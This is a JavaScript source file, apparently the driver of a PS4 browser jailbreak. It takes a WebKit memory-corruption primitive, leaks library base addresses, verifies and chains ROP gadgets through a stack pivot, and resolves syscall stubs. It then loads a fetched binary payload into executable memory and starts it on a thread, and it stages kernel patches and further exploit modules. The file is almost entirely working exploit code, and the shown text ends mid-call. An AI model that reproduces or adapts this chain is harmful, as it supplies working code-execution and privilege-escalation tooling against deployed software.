"import { establishPrimitive } from "./core.js?v=28";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor, PS4 } from "./ps4_offsets.js?v=3";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0,
  failCount = 0;
let armedEver = false;
const params = new URLSearchParams(location.search);
const PROBE_MODE = params.get("probe") === "1";
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

function post(tag, detail) {
  /* HX1400_POST_DISABLED */
  if (params.get("hx1400") === "1") {
    return;
  }

  try {
    const x = new XMLHttpRequest();
    x.open("POST", "/t", true);
    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x.send(
      "PS4-JB&tag=" +
        encodeURIComponent(tag) +
        "&detail=" +
        encodeURIComponent(String(detail == null ? "" : detail)),
    );
  } catch (e) {}
}

const VERBOSE = params.get("verbose") === "1";
const PROSE = [
  / -- /,
  /\.\s/,
  /;\s/,
  /,\s+(which|so|and that|because|since|as that)\s/,
  /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
  /\s+so\s+[a-z]/,
  /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
  if (VERBOSE || s == null) return s;
  s = String(s);
  for (const re of PROSE) {
    const m = re.exec(s);
    if (m && m.index > 0) s = s.slice(0, m.index);
  }
  s = s.replace(/\s+$/, "");
  if (s.length > 140) s = s.slice(0, 140) + "...";
  return s;
}

const SHOW_LOG = params.get("log") === "1";

/* UPDATE_RAM_BOX */
const ramBox =
  document.getElementById("ramBox");

function formatMB(bytes) {
  bytes = Number(bytes || 0);

  if (bytes <= 0) {
    return "0MB";
  }

  return (
    (bytes / (1024 * 1024)).toFixed(2) +
    "MB"
  );
}

function updateRamBox() {
  if (!ramBox) {
    return;
  }

  let heapText =
    "JS heap: N/A";

  try {
    if (
      performance &&
      performance.memory
    ) {
      const used =
        Number(
          performance.memory.usedJSHeapSize || 0,
        );

      const limit =
        Number(
          performance.memory.jsHeapSizeLimit || 0,
        );

      if (limit > 0) {
        const percent =
          used / limit * 100;

        heapText =
          "JS heap: " +
          percent.toFixed(1) +
          "% (" +
          formatMB(used) +
          "/" +
          formatMB(limit) +
          ")";
      } else {
        heapText =
          "JS heap: " +
          formatMB(used);
      }
    }
  } catch (ramError) {
    heapText =
      "JS heap: error";
  }

  let coreText =
    "core: N/A";

  try {
    const info =
      globalThis.__CORE_MEM_INFO;

    if (info) {
      coreText =
        "core: slots=" +
        info.slots +
        " drain=" +
        info.drainCount +
        "x" +
        formatMB(info.drainSize) +
        " est=" +
        formatMB(info.estimatedBytes) +
        " mem=" +
        info.memLevel;
    }
  } catch (coreError) {
    coreText =
      "core: error";
  }

  ramBox.textContent =
    heapText + " | " + coreText;
}

if (ramBox) {
  updateRamBox();

  setInterval(
    updateRamBox,
    500,
  );
}

if (SHOW_LOG && document.body) document.body.className = "log";
function finishUI(ok) {
  if (SHOW_LOG || !document.body) return;
  const m = document.getElementById("msg");
  if (m)
    m.textContent = ok
      ? "DONE"
      : armedEver
        ? "Restart your console"
        : "Refresh the page and run again";
  document.body.className = ok ? "done" : "fail";
}
function mark(tag, detail) {
  const raw = detail;
  detail = terse(detail);

  lines.push(
    tag +
    (
      detail == null || detail === ""
        ? ""
        : "  " + detail
    ),
  );

  if (lines.length > 600) {
    lines.splice(
      0,
      lines.length - 600,
    );
  }

  if (SHOW_LOG && outEl) {
    outEl.textContent =
      lines.join("\n");

    outEl.scrollTop =
      outEl.scrollHeight;
  }

  post(tag, raw);
}

function trace(tag, detail) {
  if (VERBOSE) mark(tag, detail);
  else post(tag, detail);
}
function state(t, c) {
  if (!SHOW_LOG || !stateEl) return;
  stateEl.textContent = t;
  stateEl.className = c || "";
}
function check(name, ok, detail) {
  if (ok) {
    passCount++;
    mark("PROOF-OK", name + (detail ? "  " + detail : ""));
  } else {
    failCount++;
    mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
  }
  return ok;
}

const SYS = {
  getpid: 20,
  getuid: 0x18,
  close: 6,
  socket: 97,
  socketpair: 0x87,
  getsockopt: 118,
  setsockopt: 0x69,
  mmap: 477,
  munmap: 73,
  thr_self: 432,
  getgroups: 79,
  getgid: 47,
  cpuset_getaffinity: 487,
  cpuset_setaffinity: 488,
  aio_multi_poll: 664,
  aio_multi_delete: 662,
  getegid: 43,
  aio_multi_wait: 663,
  aio_multi_cancel: 666,
    aio_submit_cmd: 669,
  write: 4,
  sysctl: 202,
  kill: 37,
  getppid: 39,
  kqueue: 362,
  kevent: 363,
  jitshm_create: 533,
};
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const keepAlive = [];
let mainMf = null,
  mainOrig = null,
  mainArmed = false;
let pinRestore = null;

let jbRestoreHook = null;
let allDone = false,
  jailbroken = false,
  kpatched = false,
  payloadRunning = false;

(async function () {
  let p = null;

  const opened = [];
  let closeFd = null;
  try {
    const { key, off } = offsetsFor(navigator.userAgent);
    mark("BUILD", "jb=skipjb2 base=ef1670a");
    mark("FW", key || "(not a PS4 UA)");
    if (!off) {
      /* NONPS4-DEBUG */
      try {
        document.body.classList.add("log");
      } catch (e) {}

      state("not a PS4 browser - debug mode", "warn");

      mark(
        "NONPS4-DEBUG",
        "ua=" + (navigator.userAgent || "unknown"),
      );

      try {
        mark(
          "NONPS4-OFFSETS",
          "supported=" + Object.keys(PS4).join(","),
        );
      } catch (e) {
        mark("NONPS4-OFFSETS", "error=" + String(e));
      }

      try {
        const off14 = PS4["14.00"];

        if (off14) {
          mark(
            "NONPS4-14",
            "present " +
            "webkit=" + off14.wk_expm1_builtin +
            " poprdi=0x" + off14.wk_POP_RDI_RET.toString(16) +
            " poprsi=0x" + off14.wk_POP_RSI_RET.toString(16) +
            " poprdx=0x" + off14.wk_POP_RDX_RET.toString(16),
          );
        } else {
          mark("NONPS4-14", "entry=missing");
        }
      } catch (e) {
        mark("NONPS4-14", "error=" + String(e));
      }

      try {
        const info = globalThis.__CORE_MEM_INFO;

        if (info) {
          mark(
            "NONPS4-CORE",
            "hx1400=" + info.hx1400 +
            " memLevel=" + info.memLevel +
            " slots=" + info.slots +
            " drain=" + info.drainCount +
            " est=" + info.estimatedBytes,
          );
        } else {
          mark("NONPS4-CORE", "info=missing");
        }
      } catch (e) {
        mark("NONPS4-CORE", "error=" + String(e));
      }

      allDone = true;
      return;
    }
    const fwKey = key || "unknown";

    const PRIMITIVE_ONLY = params.get("stop") === "primitive";

    if (PRIMITIVE_ONLY) {
      state("testing WebKit primitive...", "warn");

      await new Promise(function (resolve) {
        setTimeout(resolve, 0);
      });

      const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;

      const carrier = await establishPrimitive({
        maxAttempts: 6,
        onEvent: function (tag, detail, attempt) {
          const writer = PRIMITIVE_LOUD.test(tag) ? mark : trace;

          writer(
            tag,
            (attempt != null ? "[" + attempt + "] " : "") +
              (detail || ""),
          );
        },
      });

      installWindowP(carrier, { promote: false });

      const pp = window.p;

      const cell = pp.leakval(Math.expm1);

      const nativeFn = pp.read8(
        pp.read8(cell.add32(0x18)).add32(
          off.wk_JSFunction_m_function,
        ),
      );

      const webkitBase = nativeFn.sub32(
        off.wk_expm1_builtin,
      );

      const aligned = function (value) {
        return value.hi > 0 && (value.low & 0x3fff) === 0;
      };

      const primitiveOk = aligned(webkitBase);

      try {
        const errorFn = pp.read8(
          webkitBase.add32(off.wk___imp___error),
        );

        const libkernelBase = errorFn.sub32(
          off.k__error,
        );

        mark(
          "BASES",
          "webkit=" + webkitBase +
          " libkernel=" + libkernelBase,
        );
      } catch (baseError) {
        mark(
          "BASES",
          "webkit=" + webkitBase +
          " libkernel=unresolved",
        );
      }

      mark(
        "PRIMITIVE-ONLY",
        primitiveOk ? "PASS" : "FAIL",
      );

      allDone = true;
      finishUI(primitiveOk);
      return;
    }


    const DO_JB = params.get("jb") !== "0";
    const DO_PATCH = params.get("patch") !== "0";
    const DO_PAYLOAD = params.get("payload") !== "0";
    const SKIPJB = params.get("skipjb") !== "0";

    const KEEP_JB = params.get("keepjb") === "1";

    const HX1400_MODE = params.get("hx1400") === "1";
    const NEED_K = HX1400_MODE ? [] : [
      "k_idt_rsvd",
      "k_oid_kern_file",
      "k_oid_maxfilesperproc",
      "k_oid_maxprocperuid",
      "k_oid_maxfiles",
      "k_arg1_maxfilesperproc",
      "k_arg1_maxprocperuid",
      "k_arg1_maxfiles",
      "k_prison0",
      "k_rootvnode",
    ];
    const missing = NEED_K.filter((k) => off[k] === undefined);
    if (
      !check(
        "kernel-table-present",
        missing.length === 0 || PROBE_MODE,
        "fw=" +
          fwKey +
          " missing=[" +
          missing.join(",") +
          "]" +
          " -- dump this firmware with kdump5.html and derive its table" +
          " with tools/kderive.py; stage=pre_primitive",
      )
    )
      return;

    const KPATCH_FILE =
      "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
    const PAYLOAD_FILE = off.payload || "payload.bin";
    const needPatch = HX1400_MODE ? [] : ["k_sysent_661", "k_jmp_rsi"].filter(
      (k) => off[k] === undefined,
    );
    if (
      !check(
        "kpatch-table-present",
        !DO_PATCH || PROBE_MODE || needPatch.length === 0,
        "missing=[" +
          needPatch.join(",") +
          "] blob=" +
          KPATCH_FILE +
          " -- build it from patches/<fw>.c, see patches/1300.c",
      )
    )
      return;
    const needPl = HX1400_MODE ? [] : ["wk___imp_pthread_create", "k_pthread_create"].filter(
      (k) => off[k] === undefined,
    );
    if (
      !check(
        "payload-table-present",
        !DO_PAYLOAD || PROBE_MODE || needPl.length === 0,
        "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE,
      )
    )
      return;
    mark("FW-STATUS", off.fw_status || "none");
    mark(
      "FW-KTABLE",
      "idt_rsvd=" +
        (
          off.k_idt_rsvd === undefined
            ? "undefined"
            : "0x" + off.k_idt_rsvd.toString(16)
        ) +
      " prison0=" +
        (
          off.k_prison0 === undefined
            ? "undefined"
            : "0x" + off.k_prison0.toString(16)
        ) +
      " rootvnode=" +
        (
          off.k_rootvnode === undefined
            ? "undefined"
            : "0x" + off.k_rootvnode.toString(16)
        ) +
      " kpatch=" +
        KPATCH_FILE +
      " payload=" +
        PAYLOAD_FILE +
      " src=ps4_offsets.js",
    );

    // ---- benign-miss auto-retry (reads only, before any kernel write) ----
    // A passA/passB "no crossing" is a recoverable reclaim miss in the READ
    // phase -- no kernel .data/.text has been touched yet, so reloading and
    // retrying is safe. The counter lives in sessionStorage so it survives
    // the reload and is cleared the moment the read phase succeeds, so a
    // later manual run always starts fresh. NEVER call retryBenign() after a
    // kernel write: a reload would re-enter with the kernel already modified.
    // A hard KP (a total reclaim miss that faults inside the cancel walk)
    // cannot be caught here and still needs a reboot -- this only recovers
    // the benign, detectable misses.
    const retryArg = parseInt(params.get("retry") || "", 10);
    const RETRY_MAX = Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
    const RETRY_KEY = "jb1352-read-retry";
    const retryCount = () => {
      try {
        const v = parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10);
        return Number.isFinite(v) && v > 0 ? v : 0;
      } catch (e) {
        return 0;
      }
    };
    const clearRetry = () => {
      try {
        sessionStorage.removeItem(RETRY_KEY);
      } catch (e) {}
    };
    const retryBenign = (why) => {
      const n = retryCount();
      if (n >= RETRY_MAX) {
        mark(
          "AUTO-RELOAD-GIVEUP",
          "why=" + why + " reloads=" + n + " -- reboot and try again",
        );
        return false;
      }
      let stored = -1;
      try {
        sessionStorage.setItem(RETRY_KEY, String(n + 1));
        stored = parseInt(sessionStorage.getItem(RETRY_KEY) || "-1", 10);
      } catch (e) {
        stored = -1;
      }
      if (stored !== n + 1) {
        mark(
          "AUTO-RELOAD-NO-STORAGE",
          "why=" + why + " wrote=" + (n + 1) + " read=" + stored,
        );
        return false;
      }
      mark("AUTO-RELOAD", "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX);
      setTimeout(() => {
        try {
          location.reload();
        } catch (e) {}
      }, 400);
      return true;
    };
    if (retryCount() > 0)
      mark("AUTO-RELOAD-RESUME", "reload=" + retryCount() + "/" + RETRY_MAX);

    state("running the primitive...", "warn");
    await new Promise((r) => setTimeout(r, 0));

    const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
    const carrier = await establishPrimitive({
      maxAttempts: 6,
      onEvent: (t, d, a) =>
        (PRIMITIVE_LOUD.test(t) ? mark : trace)(
          t,
          (a != null ? "[" + a + "] " : "") + (d || ""),
        ),
    });
    installWindowP(carrier, { promote: false });
    if (!window.p) throw new Error("window.p was not installed");
    p = window.p;
    mark(
      "PAIR-STATUS",
      "state=" +
        pairStatus.state +
        " promoted=" +
        pairStatus.promoted +
        "   (promotion off: the 137 MB stays pinned)",
    );
    mark("PRIMITIVE-OK", "");

    const cell = p.leakval(Math.expm1);
    const nativeFn = p.read8(
      p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function),
    );
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    let libkernelBase = errorFn.sub32(off.k__error);

    if (HX1400_MODE || PROBE_MODE) {
      const libkernelAdjust =
        libkernelBase.low & 0x3fff;

      if (libkernelAdjust !== 0) {
        libkernelBase =
          libkernelBase.sub32(
            libkernelAdjust,
          );

        mark(
          "HX1400-LIBKERNEL-ALIGN",
          "adjust=0x" +
          libkernelAdjust.toString(16) +
          " base=" +
          libkernelBase,
        );
      }
    }

    mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
    const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
    if (
      !check(
        "module-bases-0x4000-aligned",
        aligned(webkitBase) && aligned(libkernelBase),
        "",
      )
    )
      return;

    const G = {};
    const GAD = [
      ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
      ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
      ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
      ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
      ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
      ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
      ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
      ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
      [
        "MOV_RDI_RAX_RET",
        off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
        [0x48, 0x89, 0x07, 0xc3],
      ],
      ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
      ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
      ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
      ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
      [
        "G4",
        off.wk_MOV_RDX_RAX_18_CALL_10,
        [0x48, 0x8b, 0x50, off.pivot_view_sp],
      ],
      ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
    ];
    let gated = 0;
    for (const [nm, rva, pat] of GAD) {
      const a = webkitBase.add32(rva);
      let good = true;
      for (let i = 0; i < pat.length; ++i) {
        if (pat[i] === null) continue;
        if (p.read1(a.add32(i)) !== pat[i]) {
          good = false;
          break;
        }
      }
      if (good) {
        G[nm] = a;
        gated++;
      } else mark("GADGET-BAD", nm);
    }
    if (
      !check(
        "gadget-table-fits-module",
        gated === GAD.length,
        gated + "/" + GAD.length,
      )
    )
      return;
    const argGadget = [
      G.POP_RDI_RET,
      G.POP_RSI_RET,
      G.POP_RDX_RET,
      G.POP_RCX_RET,
      G.POP_R8_RET,
      G.POP_R9_RET,
    ];

    const stubAddr = new Map();
    let seeded = 0;
    if (off.k_stubs) {
      for (const numStr in off.k_stubs) {
        const num = +numStr,
          o = off.k_stubs[numStr];
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
        if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 !== num)
          continue;
        stubAddr.set(num, libkernelBase.add32(o));
        seeded++;
      }
    }
    const need = new Set(
      Object.keys(SYS)
        .map((k) => SYS[k])
        .filter((n) => !stubAddr.has(n)),
    );
    let scanned = 0;
    for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
      const v = p.read8(libkernelBase.add32(o));
      if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
      const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
      if (!need.has(num)) continue;
      stubAddr.set(num, libkernelBase.add32(o));
      need.delete(num);
      scanned++;
    }
    mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
    const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
      return;

    if (PROBE_MODE) {
      const rd4 = (a) => p.read4(a) >>> 0;
      const B = libkernelBase;
      const symHash = (name) => {
        let h = 0;
        for (let i = 0; i < name.length; i++)
          h = (h << 4) + name.charCodeAt(i);
        const g = h & 0xf0000000;
        if (g) h ^= g >>> 24;
        return (h & ~g) >>> 0;
      };
      const cstrAt = (addr) => {
        let out = "";
        for (let i = 0; i < 64; i++) {
          const b = p.read1(addr.add32(i));
          if (b === 0) break;
          out += String.fromCharCode(b);
        }
        return out;
      };
      const phoff = p.read8(B.add32(0x20));
      const phentsize = rd4(B.add32(0x36)) & 0xffff;
      const phnum = rd4(B.add32(0x38)) & 0xffff;
      let dynV = null;
      for (let k = 0; k < phnum; k++) {
        const ph = B.add32(phoff).add32(k * phentsize);
        if (rd4(ph) === 2) {
          dynV = p.read8(ph.add32(0x10));
          break;
        }
      }
      let strV = null,
        symV = null,
        hashV = null,
        symEnt = 24;
      if (dynV) {
        for (let k = 0; k < 4096; k++) {
          const tag = p.read8(dynV.add32(k * 16));
          const val = p.read8(dynV.add32(k * 16 + 8));
          if (tag.low === 0 && tag.hi === 0) break;
          if (tag.low === 5) strV = val;
          else if (tag.low === 6) symV = val;
          else if (tag.low === 4) hashV = val;
          else if (tag.low === 11) symEnt = val.low >>> 0;
        }
      }
      check(
        "elf-dynamic-parsed",
        !!dynV && !!strV && !!symV && !!hashV,
        "dyn=" + dynV + " strtab=" + strV + " symtab=" + symV + " hash=" + hashV,
      );
      let mountStub = null,
        mountNum = -1;
      if (dynV && strV && symV && hashV) {
        const nbucket = rd4(B.add32(hashV));
        const h = symHash("mount");
        let idx = rd4(B.add32(hashV).add32(8 + (h % nbucket) * 4));
        let guard = 0;
        while (idx !== 0 && guard++ < 4096) {
          const sym = B.add32(symV).add32(idx * symEnt);
          if (cstrAt(B.add32(strV).add32(rd4(sym))) === "mount") {
            mountStub = B.add32(p.read8(sym.add32(8)));
            const sv = p.read8(mountStub);
            if ((sv.low & 0x00ffffff) === 0xc0c748 && sv.hi >>> 24 === 0x49)
              mountNum =
                ((sv.low >>> 24) | ((sv.hi & 0x00ffffff) << 8)) >>> 0;
            break;
          }
          idx = rd4(B.add32(hashV).add32(8 + nbucket * 4 + idx * 4));
        }
      }
      check(
        "mount-sym-found",
        !!mountStub,
        mountStub
          ? "stub=" + mountStub + " syscall=" + mountNum
          : "mount NOT exported by libkernel .dynsym",
      );
      if (mountStub && mountNum >= 0) {
        const strBuf = (txt) => {
          const ab = new ArrayBuffer(txt.length + 1);
          keepAlive.push(ab);
          const u8 = new Uint8Array(ab);
          for (let i = 0; i < txt.length; i++) u8[i] = txt.charCodeAt(i);
          u8[txt.length] = 0;
          return ab;
        };
        const typeAb = strBuf("ufs");
        const dirAb = strBuf("/mnt/usb0");
        const specAb = strBuf("/dev/da0s1");
        const argsAb = new ArrayBuffer(0x20);
        keepAlive.push(argsAb);
        put(new DataView(argsAb), 0x00, bufAddr(specAb));
        const mrv = callAddr(mountStub, [
          bufAddr(typeAb),
          bufAddr(dirAb),
          1,
          bufAddr(argsAb),
        ]).i32;
        const merr = mrv !== 0 ? errno() : 0;
        mark(
          "PROBE-MOUNT",
          "mount(syscall=" +
            mountNum +
            ",ufs,/mnt/usb0,RDONLY,/dev/da0s1) rv=" +
            mrv +
            " errno=" +
            merr +
            " (2=ENOENT-no-usb 1=EPERM-sandbox 0=mounted?!)",
        );
      }
      mark("PROBE-DONE", "mount reachability probed; stopping");
      return;
    }


    function bufAddr(ab) {
      const c = p.leakval(ab);
      return p.read8(
        p
          .read8(c.add32(off.wk_ArrayBuffer_m_impl))
          .add32(off.wk_ArrayBuffer_m_contents_m_data),
      );
    }
    function put(dv, at, v) {
      if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
      } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
      }
    }
    const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
    function makeCtx() {
      const sb = new ArrayBuffer(0x20),
        pb = new ArrayBuffer(PB_SIZE);
      const kb = new ArrayBuffer(0x2000),
        fb = new ArrayBuffer(0x40);
      keepAlive.push(sb, pb, kb, fb);
      const c = {
        storeDv: new DataView(sb),
        pivotDv: new DataView(pb),
        stackDv: new DataView(kb),
        frameDv: new DataView(fb),
        stackU8: new Uint8Array(kb),
        frameU8: new Uint8Array(fb),
      };
      keepAlive.push(
        c.storeDv,
        c.pivotDv,
        c.stackDv,
        c.frameDv,
        c.stackU8,
        c.frameU8,
      );
      c.S = bufAddr(sb);
      c.P = bufAddr(pb);
      c.K = bufAddr(kb);
      c.F = bufAddr(fb);
      put(c.storeDv, 0x00, G.G1);
      put(c.storeDv, 0x08, c.P);
      put(c.storeDv, 0x10, G.G3);
      put(c.storeDv, 0x18, G.G2);
      put(c.pivotDv, 0x00, c.P);
      put(c.pivotDv, 0x10, G.G5);
      put(c.pivotDv, 0x20, G.G4);
      return c;
    }
    function layout(c, target, args) {
      c.stackU8.fill(0);
      c.frameU8.fill(0);
      const insts = [];
      for (let i = 0; i < args.length; ++i) {
        insts.push(argGadget[i]);
        insts.push(args[i]);
      }
      const targetIdx = insts.length;
      insts.push(target);
      insts.push(G.POP_RDI_RET);
      insts.push(c.F);
      insts.push(G.MOV_RDI_RAX_RET);
      insts.push(G.POP_RAX_RET);
      insts.push(JSVALUE_UNDEFINED);
      insts.push(G.LEAVE_RET);
      let at = 0x2000 - 8 * insts.length;
      if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
      for (let i = 0; i < insts.length; ++i)
        put(c.stackDv, at + 8 * i, insts[i]);
      put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
    }
    const M = makeCtx();
    mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
    mainOrig = p.read8(mainMf);
    const pivotObj = {};
    keepAlive.push(pivotObj);
    const pivotCell = p.leakval(pivotObj);
    p.write8(mainMf, G.G0);
    mainArmed = true;
    function callAddr(target, args) {
      layout(M, target, args);
      const saved = p.read8(pivotCell);
      p.write8(pivotCell, M.S);
      Math.expm1(pivotObj);
      p.write8(pivotCell, saved);
      return {
        lo: M.frameDv.getUint32(0, true),
        hi: M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0,
      };
    }
    const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
    closeFd = (fd) => sc(SYS.close, fd).i32;
    function errno() {
      const r = callAddr(errorFn, []);
      const a = new int64(r.lo, r.hi);
      return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
    }
    function dynsymLookup(name) {
      const B = libkernelBase;
      const rd4 = (a) => p.read4(a) >>> 0;
      const rd8 = (a) => p.read8(a);
      if (!globalThis.__elf) {
        const phoff = rd8(B.add32(0x20));
        const phentsize = rd4(B.add32(0x36)) & 0xffff;
        const phnum = rd4(B.add32(0x38)) & 0xffff;
        let dynV = null;
        for (let k = 0; k < phnum; k++) {
          const ph = B.add32(phoff).add32(k * phentsize);
          if (rd4(ph) === 2) { dynV = rd8(ph.add32(0x10)); break; }
        }
        let strV = null, symV = null, hashV = null, symEnt = 24;
        for (let k = 0; k < 4096; k++) {
          const tag = rd8(dynV.add32(k * 16));
          const val = rd8(dynV.add32(k * 16 + 8));
          if (tag.hi === 0 && tag.low === 0) break;
          if (tag.low === 5) strV = val;
          else if (tag.low === 6) symV = val;
          else if (tag.low === 4) hashV = val;
          else if (tag.low === 11) symEnt = val.low >>> 0;
        }
        globalThis.__elf = { strV, symV, hashV, symEnt };
      }
      const E = globalThis.__elf;
      let h = 0;
      for (let i = 0; i < name.length; i++) h = (h << 4) + name.charCodeAt(i);
      const g = h & 0xf0000000;
      if (g) h ^= g >>> 24;
      h &= ~g;
      const B2 = libkernelBase;
      const nb = (a) => (p.read4(a) >>> 0);
      const nbucket = nb(B2.add32(E.hashV));
      let idx = nb(B2.add32(E.hashV).add32(8 + (h % nbucket) * 4));
      let guard = 0;
      while (idx !== 0 && guard++ < 4096) {
        const sym = B2.add32(E.symV).add32(idx * E.symEnt);
        const nameOff = nb(sym);
        let s = "";
        for (let i = 0; i < 64; i++) {
          const ch = p.read1(B2.add32(E.strV).add32(nameOff + i));
          if (ch === 0) break;
          s += String.fromCharCode(ch);
        }
        if (s === name) return B2.add32(p.read8(sym.add32(8)));
        idx = nb(B2.add32(E.hashV).add32(8 + nbucket * 4 + idx * 4));
      }
      return null;
    }

    let restartAdvised = false;
    async function adviseRestart(why) {
      if (restartAdvised) return;
      restartAdvised = true;
      mark(
        "RESTART-NEEDED",
        why + " -- FULL power off the console (not Rest Mode), then power on",
      );
      try {
        if (!p || !callAddr || !libkernelBase) {
          mark("RESTART-MANUAL", "no memory primitive - reboot by hand");
          return;
        }
        const rb = dynsymLookup("reboot");
        if (!rb) {
          mark("RESTART-MANUAL", "reboot not exported by libkernel - reboot by hand");
          return;
        }
        mark("RESTART-AUTO", "trying reboot() via " + rb);
        const rv = callAddr(rb, [0, 0]).i32;
        mark(
          "RESTART-AUTO",
          "reboot() returned " + rv + " (sandbox blocked it) - reboot by hand",
        );
      } catch (e) {
        mark("RESTART-MANUAL", "auto-reboot failed: " + (e && e.message) + " - reboot by hand");
      }
    }

    async function relaunchPayload() {
      let blob = null;
      try {
        const r = await fetch(PAYLOAD_FILE);
        if (r.ok) blob = new Uint8Array(await r.arrayBuffer());
      } catch (e) {}
      if (!blob || blob[0] !== 0xe9) {
        mark("JB-RELAUNCH", "file=" + PAYLOAD_FILE + " blob=unusable");
        return;
      }
      const sz = (blob.length + 0x3fff) & ~0x3fff;
      const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
      const entry = new int64(m.lo, m.hi);
      if (m.i32 === -1 || entry.hi >>> 0 === 0) {
        mark("JB-RELAUNCH", "mmap failed err=" + errno());
        return;
      }
      for (let o = 0; o < blob.length; o += 8) {
        let lo = 0,
          hi = 0;
        for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
        for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
        p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
      }
      let bad = -1;
      for (let o = 0; o < blob.length && bad < 0; o++)
        if (p.read1(entry.add32(o)) !== blob[o]) bad = o;
      if (bad >= 0) {
        mark("JB-RELAUNCH", "copy MISMATCH@0x" + bad.toString(16));
        return;
      }
      const fn = p.read8(webkitBase.add32(off.wk___imp_pthread_create));
      const expect = libkernelBase.add32(off.k_pthread_create);
      if (fn.low !== expect.low || fn.hi !== expect.hi) {
        mark("JB-RELAUNCH", "pthread_create got=" + fn + " want=" + expect);
        return;
      }
      const thr = new ArrayBuffer(8);
      keepAlive.push(thr);
      new Uint8Array(thr).fill(0);
      const rc = callAddr(expect, [bufAddr(thr), 0, entry, 0]).i32;
      const tdv = new DataView(thr);
      const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
      payloadRunning = rc === 0 && handle.hi >>> 0 > 0;
      check(
        "JB-RELAUNCH",
        payloadRunning,
        "file=" +
          PAYLOAD_FILE +
          " bytes=" +
          blob.length +
          " pthread_create=" +
          rc +
          " handle=" +
          handle,
      );
    }

    
    if (params.get("hx1400") === "1") {
      try {
        const hx = await import("./hx1400_port.js?v=7");
        if (!hx || typeof hx.runHx1400 !== "function") {
          mark(
            "HX1400-BAD-MODULE",
            "runHx1400 missing - stale cached module? bump v and hard reload",
          );
          allDone = true;
          finishUI(false);
          return;
        }

        if (params.get("kv") === "1") {
          mark("KV-START", "entering kv path");
          try {
            await hx.runHx1400({
              p: p, sc: sc, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
              webkitBase: webkitBase, libkernelBase: libkernelBase, G: G,
              stubAddr: stubAddr, int64: int64, params: params, keepAlive: keepAlive,
              mark: mark, trace: trace, state: state, check: check,
              fetchFile: async function (path) {
                const response = await fetch(path);
                if (!response.ok) throw new Error(path + " HTTP " + response.status);
                return new Uint8Array(await response.arrayBuffer());
              },
            });
            const kvb = await import("./hx_kevent.js?v=1");
            const kvOk = await kvb.runKevent({
              p: p, sc: sc, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
              webkitBase: webkitBase, libkernelBase: libkernelBase, G: G,
              stubAddr: stubAddr, int64: int64, params: params, keepAlive: keepAlive,
